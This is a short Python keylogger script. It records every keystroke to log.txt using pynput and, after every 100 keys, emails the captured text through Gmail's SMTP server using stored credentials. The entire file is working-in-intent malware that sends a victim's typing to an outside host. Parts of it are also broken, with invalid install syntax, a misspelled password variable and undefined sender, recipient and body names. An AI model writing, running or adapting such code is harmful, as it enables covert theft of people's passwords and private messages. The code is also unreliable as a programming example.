try:
    import pynput
except:
    try:
        pip-install (pynput)
    except:
        exit

from pynput.keyboard import Key, Listener

from data import gmail_user, gmail_pass
usr=gmail_user
pwd=gmail_pass
email=usr
subject="Informe"

count=0
keys=[]
n=0

open("log.txt", "w")

def on_press(key):
    global count
    count=count+1
    with open("log.txt", "a") as file:
        if key == Key.space:
            file.write(" ")
        elif key == Key.enter:
            file.write("  /  ")
        else:
            file.write(str(key))

    print("{0} pressed".format(key))

    if count == 100:
        with open("log.txt", "r+") as file:
            body=file.read()
            file.truncate()

        body.encode('utf-8').strip()
            
        send_mail(usr, pwd, email, subject, body)


def on_release(key):
    if key==Key.esc:
        return False

def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            f.write(str(key))

def send_mail(usr, pwd, email, subject, body):
    import smtplib
    from smtplib import SMTP

    server=smtplib .SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(gmail_user, gmail_pas)
    server.sendmail(FROM, TO, text)
    server.close()




with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
